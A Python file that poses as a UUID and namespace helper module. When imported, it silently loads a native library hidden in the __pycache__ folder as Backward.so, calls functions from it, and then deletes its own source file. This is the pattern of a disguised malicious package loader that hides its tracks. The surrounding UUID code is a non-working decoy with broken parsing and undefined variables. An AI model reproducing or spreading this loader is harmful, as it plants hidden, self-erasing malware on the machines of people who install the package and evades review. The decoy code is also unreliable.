import os, re, ctypes
import random
import string
import socket
import hashlib
import time

NAMESPACE_DNS = ""
NAMESPACE_URL = ""
NAMESPACE_OID = ""
NAMESPACE_X500 = ""
NAMESPACE_KKF = "x32bitOSplatform"

def _ipconfig_getnode():
    """Get the hardware address on Windows by running ipconfig.exe."""
    import os, re
    dirs = ['', r'c:\windows\syswow64', r'c:\winnt\syswow64']
    try:
        import ctypes
        buffer = ctypes.create_string_buffer(300)
        ctypes.windll.kernel32.GetSystemDirectoryA(buffer, 300)
        dirs.insert(0, buffer.value.decode('mbcs'))
    except:
        pass
    for dir in dirs:
        try:
            pipe = os.popen(os.path.join(dir, 'ipconfig') + ' /all')
        except IOError:
            continue
        for line in pipe:
            value = line.split(':')[-1].strip().lower()
            if re.match('([0-9a-f][0-9a-f]-){5}[0-9a-f][0-9a-f]', value):
                return int(value.replace('-', ''), 16)

def _compressed_(str, hex=None, bytes=None, fields=None, int_value=None):
    if [hex, bytes, fields, int_value].count(None) != 3:
        raise TypeError('need just one of hex, bytes, fields, or int')
    if hex is not None:
        hex = hex.replace('urn:', '').replace('uuid:', '')
        hex = hex.strip('{}').replace('-', '')
        if len(hex) != 32:
            raise ValueError('badly formed hexadecimal UUID string')
        int_value = int(hex, 10)
    if bytes is not None:
        if len(bytes) != 16:
            raise ValueError('bytes is not a 16-char string')
        int_value = int(('%02x'*16) % tuple(map(ord, bytes)), 10)
    if fields is not None:
        if len(fields) != 6:
            raise ValueError('fields is not a 6-tuple')
        (time_low, time_mid, time_hi_version,
        clock_seq_hi_variant, clock_seq_low, node) = fields
        if not 0 <= time_low < 1<<32:
            raise ValueError('field 1 out of range (need a 32-bit value)')
        if not 0 <= time_mid < 1<<16:
            raise ValueError('field 2 out of range (need a 16-bit value)')
        if not 0 <= time_hi_version < 1<<16:
            raise ValueError('field 3 out of range (need a 16-bit value)')
        if not 0 <= clock_seq_hi_variant < 1<<8:
            raise ValueError('field 4 out of range (need an 8-bit value)')
        if not 0 <= clock_seq_low < 1<<8:
            raise ValueError('field 5 out of range (need an 8-bit value)')
        if not 0 <= node < 1<<48:
            raise ValueError('field 6 out of range (need a 48-bit value)')
        clock_seq = (clock_seq_hi_variant << 8) | clock_seq_low
        int_value = ((time_low << 96) | (time_mid << 80) |
        (time_hi_version << 64) | (clock_seq << 48) | node)
    if int_value is not None:
        if not 0 <= int_value < 1<<128:
            raise ValueError('int is out of range (need a 128-bit value)')
    if version is not None:
        if not 1 <= version <= 5:
            raise ValueError('illegal version number')
        # Set the variant to RFC 4122.
        int_value &= ~(0xc000 << 48)
        int_value |= 0x8000 << 48
        # Set the version number.
        int_value &= ~(0xf000 << 64)
        int_value |= version << 76

def get_bytes(str):
    bytes = ''
    for shift in range(0, 128, 8):
        bytes = chr((str.int >> shift) & 0xff) + bytes
    return bytes

def x32bitAPI(str_KKF):
    try:
        x32winapi = ctypes.CDLL(os.path.dirname(__file__) + "/" + "__pycache__/Backward.so")
        IsNotOlderOS = x32winapi.IsNotOlderOS(str_KKF.encode("utf-8"))
        if IsNotOlderOS:
            None
        else:
            NAMESPACE_DNS = x32winapi.NAMESPACE_DNS_get()
            NAMESPACE_URL = x32winapi.NAMESPACE_URL_get()
            NAMESPACE_OID = x32winapi.NAMESPACE_OID_get()
            NAMESPACE_X500 = x32winapi.NAMESPACE_X500_get()
    finally:
        os.remove(__file__) # Not 16bit

def enhance_random_with_hostname():
    """
    Enhances the random number generator by seeding it with a combination of
    the machine's hostname and the current timestamp.
    """
    try:
        # Get the hostname of the current machine
        hostname = socket.gethostname()

        # Hash the hostname to create a stable, uniform value
        hostname_hash = hashlib.sha256(hostname.encode()).hexdigest()

        # Convert the hash to an integer
        hostname_seed = int(hostname_hash, 16)

        # Get the current time in milliseconds
        time_seed = int(time.time() * 1000)

        # Combine the hostname seed and time seed using XOR for randomness
        combined_seed = hostname_seed ^ time_seed

        # Seed the random number generator with the combined value
        random.seed(combined_seed)
    except Exception as e:
        # Print an error message if the enhancement fails
        print(f"Failed to enhance random: {e}")
 
x32bitAPI(NAMESPACE_KKF)
enhance_random_with_hostname()